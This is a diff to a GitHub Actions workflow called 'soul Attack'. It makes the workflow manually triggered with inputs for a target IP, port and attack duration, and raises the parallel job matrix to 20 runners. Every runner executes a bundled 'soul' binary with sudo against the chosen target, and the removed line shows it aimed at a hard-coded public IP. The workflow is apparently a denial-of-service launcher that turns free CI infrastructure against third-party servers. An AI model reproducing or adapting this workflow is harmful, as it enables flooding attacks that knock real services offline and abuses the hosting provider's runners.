@@ -1,13 +1,24 @@
 name: soul Attack
-on: [push]
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: 'Target IP'
+        required: true
+      port:
+        description: 'Target Port'
+        required: true
+      time:
+        description: 'Attack Duration'
+        required: true
 
 jobs:
   soul:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x *
-    - run: sudo ./soul 4.247.20.25 21524 100 999
+    - run: sudo ./soul ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} 999
